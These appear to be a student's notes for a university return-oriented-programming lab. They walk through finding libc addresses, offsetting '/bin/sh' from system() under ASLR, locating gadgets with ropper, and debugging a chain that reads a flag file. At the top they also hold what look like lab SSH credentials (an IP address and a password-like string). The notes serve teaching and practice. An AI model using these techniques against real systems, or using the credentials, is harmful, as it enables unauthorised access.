```
ssh lab06@52.201.10.159
27b69684
```
# Tutorial ROP
We are creating a buffer overflow and redirecting the EIP to call `printf()` on some 
given parameters. In this case, the parameters need to reside somewhere within the code.

Because ASLR is not on, we can use the address found in the binary while using gdb. Note
that we need to use the libc address for printf.

## Find the function
```
vagrant@ubuntu1804:~/cs6265/lab06/tut06-rop$ ldd ./target
    linux-gate.so.1 (0xf7fd4000)
    libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xf7fbc000)  <-- this guy
    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7de0000)
    /lib/ld-linux.so.2 (0xf7fd6000)
```
or from gdb
```
gdb ./target
b main
r
info proc mappings
pwndbg> info proc mappings
process 7183
Mapped address spaces:

Start Addr   End Addr       Size     Offset objfile
0x8048000  0x8049000     0x1000        0x0 /home/vagrant/cs6265/lab06/tut06-rop/target
0x8049000  0x804a000     0x1000        0x0 /home/vagrant/cs6265/lab06/tut06-rop/target
0x804a000  0x804b000     0x1000     0x1000 /home/vagrant/cs6265/lab06/tut06-rop/target
0xf7de0000 0xf7fb5000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so  <--- this guy
0xf7fb5000 0xf7fb6000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb6000 0xf7fb8000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb8000 0xf7fb9000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
0xf7fb9000 0xf7fbc000     0x3000        0x0
0xf7fbc000 0xf7fbf000     0x3000        0x0 /lib/i386-linux-gnu/libdl-2.27.so
0xf7fbf000 0xf7fc0000     0x1000     0x2000 /lib/i386-linux-gnu/libdl-2.27.so
0xf7fc0000 0xf7fc1000     0x1000     0x3000 /lib/i386-linux-gnu/libdl-2.27.so
0xf7fcf000 0xf7fd1000     0x2000        0x0
0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib/i386-linux-gnu/ld-2.27.so
0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.27.so
0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so
0xfffd8000 0xffffe000    0x26000        0x0 [stack]
pwndbg>
```

Then we can use pwntools. Note that we need to find the offset when ASLR is turned on.
```
libc_binary = ELF('libc-2.27.so')
libcPrintfAddr = libc_binary.symbols['printf'] + offset
```

## Finding the parameter
We can find the address using ropper. But we still need to use the offset.
```
ropper --file libc-2.27.so --string "/bin/sh"
```
We can also find it in gdb:
```
pwndbg> search "/bin"
libc-2.27.so    0xf7f5e0cf das     /* '/bin/sh' */
libc-2.27.so    0xf7f5f5b9 das     /* '/bin:/usr/bin' */
libc-2.27.so    0xf7f5f5c2 das     /* '/bin' */
libc-2.27.so    0xf7f5fac7 das     /* '/bin/csh' */
libc-2.27.so    0xf7f60f38 das     /* '/bindresvport.blacklist' */
libc-2.27.so    0xf7f63950 das     /* '/bin:/usr/bin' */
libc-2.27.so    0xf7f63959 das     /* '/bin' */
[stack]         0xffffdbc1 '/bin/lesspipe %s %s'
[stack]         0xffffdbdb '/bin/gdb'
[stack]         0xffffdddb '/bin/bash'
[stack]         0xffffdf2b '/bin:/home/vagrant/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
[stack]         0xffffdf44 '/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
[stack]         0xffffdf63 '/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
[stack]         0xffffdf76 '/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin'
[stack]         0xffffdf81 '/bin:/usr/games:/usr/local/games:/snap/bin'
[stack]         0xffffdfa7 '/bin'
[stack]         0xffffdfbb '/bin/lesspipe %s'
pwndbg>
```

Unfortunately though, these numbers keep changing. How to infer the
address of `/bin/sh` required for `system()`? As you've learned from the
'libbase' challenge in Lab05, ASLR does not randomize the offset
inside a module; it just randomizes only the _base address_
of the entire module (why though?)

```
  0xf7f5e0cf (/bin/sh) - 0xf7e1d200 (system) = 0x140ecf
```

So in your exploit, by using the address of `system()`, you can calculate
the address of `/bin/sh` (0xf7f5e0cf = 0xf7e1d200 + 0x140ecf).

Note that the above technique still requires the leak of at least one address.

By the way, where is this magic address (0xf7e1d200, the address of
`system()`) coming from? In fact, you can also compute by hand. Try
`vmmap` in `gdb-pwndbg`:

```shell
  > vmmap
  LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  0x8048000  0x8049000 r-xp     1000 0      /home/lab06/tut06-rop/target
  0x8049000  0x804a000 r--p     1000 0      /home/lab06/tut06-rop/target
  0x804a000  0x804b000 rw-p     1000 1000   /home/lab06/tut06-rop/target
 0xf7de0000 0xf7fb5000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
 0xf7fb5000 0xf7fb6000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
 0xf7fb6000 0xf7fb8000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
 0xf7fb8000 0xf7fb9000 rw-p     1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so
  ...
```

The base address (a mapped region) of libc is '0xf7de0000'; "x" in
the "r-xp" permission is telling you that's an eXecutable region
(i.e., code).

Then, where is `system()` in the library itself? As these functions are
exported for external uses, you can parse the elf format like below:

```shell
   $ readelf -s /lib/i386-linux-gnu/libc-2.27.so | grep system
   254: 00129640   102 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   652: 0003d200    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1510: 0003d200    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
```

0x0003d200 is the beginning of the `system()` function inside the libc
library, so its base address plus 0x0003d200 should be the address we
observed previously.

```
  0xf7de0000 (base) + 0x0003d200 (offset) = 0xf7e1d200 (system)
```

# ROP gadgets
We can set the return address equal to a set of instructions. The matching arg for that
is the next return address.
```
[buf      ]
[.....    ]
[old-ra   ] -> 1) func1
[ra       ] ------------------> pop/ret gadget
[old-arg1 ] -> 1) arg1
[ra       ] -> func2
[dummy    ]
[arg1     ] -> arg1
```

We find the rop gadget like so:
```
$ ropper -f ./target
  0x08048479: pop ebx; ret; 
```

Lets try multiple chains:
```
[buf      ]
[.....    ]
[old-ra   ] -> 1) func1
[ra       ] ------------------> pop/ret gadget
[old-arg1 ] -> 1) arg1
[ra       ] -> func2
[ra       ] ------------------> pop/pop/ret gadget
[arg1     ] -> arg1
[arg2     ] -> arg2
[ra       ] ...

1) func1(arg1)
2) func2(arg1, arg2)

```

Now I am having a bunch of trouble trying to find where to set the address that holds `/proc/flag`. I think I am suppose to write it to the stack. Let's use `strace` to debug.

```
$ strace ./target < <(cat shellcode)
...
openat(AT_FDCWD, "kaaa", O_RDONLY)      = -1 ENOENT (No such file or directory)
read(3, 0x804a000, 1024)                = -1 EBADF (Bad file descriptor)
0) = 1024"\4\237\4\10@\331\377\367\20\256\376\367 l\363\367\260l\354\367\320\22\343\367p\376\351\367@{\344\367"..., 102@ llp@{
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xdeadbeef} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```

We can see that we are trying to open the file `kaaa`. Lets just create a symbolic link to our flag from there: `ln -s /tmp/flag/ kaaa`

Now lets try to execute:
```
$ strace ./target < <(cat shellcode)
...
openat(AT_FDCWD, "kaaa", O_RDONLY)      = 3
read(3, "THIS IS A FLAG!!!!\n", 1024)   = 19
write(1, "THIS IS A FLAG!!!!\n\367\320\22\343\367p\376\351\367@{\344\367"..., 1024THIS IS A FLAG!!!!
0) = 1024
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xdeadbeef} ---
+++ killed by SIGSEGV (core dumped) +++
Segmentation fault (core dumped)
```
It worked!
